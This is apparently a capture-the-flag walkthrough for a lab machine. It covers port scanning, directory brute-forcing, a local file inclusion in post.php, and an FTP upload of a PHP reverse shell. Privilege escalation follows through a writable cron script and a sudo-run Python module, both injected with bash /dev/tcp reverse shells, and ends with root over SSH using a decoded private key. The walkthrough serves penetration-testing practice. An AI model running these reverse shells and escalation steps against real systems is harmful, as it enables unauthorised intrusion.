## Reconnaisance

### Nmap
Nmap scan to discovery open ports.
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv <IP>`
![asdf](images/nmapScan.png)
Port scan services and versions

`nmap -p21,22,80 -sCV <IP> -oN targeted`

![asdf](images/secondNmapScan.png)

- Open : 21 = ftp 3.0.5
- Open : 22 = ssh
- Open : 80 = apache 2.4.41
### Enumeration

`whatweb http://<IP>`
![asdf](images/whatweb.png)
Metagenerator : Jekyll 4.1.1
Note: I looked for any vulnerability but, there's not the way to exploit this machine.

## Gobuster

`gobuster dir -u http://<IP> -w /usr/share/wordlists/directory-list-2.3-medium.txt`
![asdf](images/bobuster.png)
#### Founded paths
- /images
- /post.php
- /css
- /robots.txt


## post.php
On the view-source of the index.php, we can see this
![asdf](images/post1.png)

### /robots.txt
![asdf](images/robots.png)
There's the first flag

### /secret_file_do_not_read.txt
![asf](images/nope.png)
We don't have permission to see this file



### /post.php

we saw this before on the view-source from the index.php
![asdf](post2.png)

# LFI (Local File Inclusion)

I tried referer the /etc/passwd directory because the post.php referer somes files, and i tried to make a ref to the passwd, and it works.

![asdf](passwd.png)

now we can see this file : secret_file_do_not_read.txt

![asff](images/credsftp.png)
This give us the credentials of the ftp service.

## FTP
![asdf](images/ftp1.png)
Second flag found.
and there is a directory named files, that is empty.
![asdf](images/empty.png)

# Gaining access

Maybe we can upload files there, and open from the web with the post.php file.
We are going to download a php reverse shell, listen with netcat, upload the file from ftp and execute it from the victim machine with the post.php.

Link of the reverseshell of pentestmonkey.
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
just change the ip and the port.

Remember to put the script in the same path where you are login in ftp to can upload.
![asfd](images/php1.png)

now from ftp go to the path files and put the reverseshell.
![asdf](images/ftp2.png)

Listen with netcat on the port that you put.
![asdfa](images/nc.png)
and we are going to execute the file from the web page, but you need to put the path of ftp, and the path where is the file.
`http://<IP>/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php`
![asdf](images/RCE.png)

We are in.
![asd](images/nc2.png)

### Note: you will need to stabilize the shell. execute the next commands:
`python3 -c "import pty; pty.spawn('/bin/bash')"`
`export TERM=xterm`
### stty
- press `Ctrl+Z` to put it in second plane
- `stty raw -echo; fg` on your console
- `enter`

now you can do `Ctrl+C` and keep in.


## Scalling privilages

`sudo -l` show us that we can be the user toby executing this command:
`sudo -u toby /bin/bash`
![asdf](images/sudo-l1.png)
![asf](images/toby1.png)

flag3: 
`find / -name flag_3.txt 2>/dev/null`
![asdf](flag3.png)

flag4 and more things:
![asdf](images/find1.png)
![asdf](images/write.png)



`cat /etc/crontab`

in crontab we can see that the user mat is executing the file cow.sh every 1 minute. That means that if we put any reverse shell there, we can be the user mat.

![asdf](images/crontab.png)

### reverse shell
with printf we make a reverseshell and put it into the file cow.sh

`printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"\n' > /home/toby/jobs/cow.sh`
![asdf](images/prinf.png)

wati and now you are the user mat.
Note: remember to stabilize the shell

flag_5:
![asdf](images/flag5.png)
we have a path named scripts with perms, and a note.
![asdf](images/mamo.png)


`sudo -l` we can see the sudo perms and we can modify the will_script.py
![asdf](images/sudo-l2.png)

use printf to modify the script.
`printf "def get_command(num):\n    import os\n    os.system(\"bash -c 'bash -i >& /dev/tcp/<IP>/5555 0>&1'\")\n    return \"id\"\n" > /home/mat/scripts/cmd.py`
and listen with netcat.
`nc -nvlp 5555`

execute the script as will:: 
`sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1`
![asdf](images/will.png)

flag_6:
![asdf](images/flag6.png)

## /opt

I was searching for files with perms but i found a key on base64.

![asfd](images/key.png)

i decoded it and it is an id_rsa
![asdf](images/id_rsa1a.png)

decode it and make a file named id_rsa
`echo '<key>' | base64 -d > id_rsa`

put the perms to the script to we can use.

`chmod 600 id_rsa`

and log as root to ssh

`ssh -i id_rsa root@<IP>`

and we are root.
![asdf](images/root.png)

Thanks for watch.
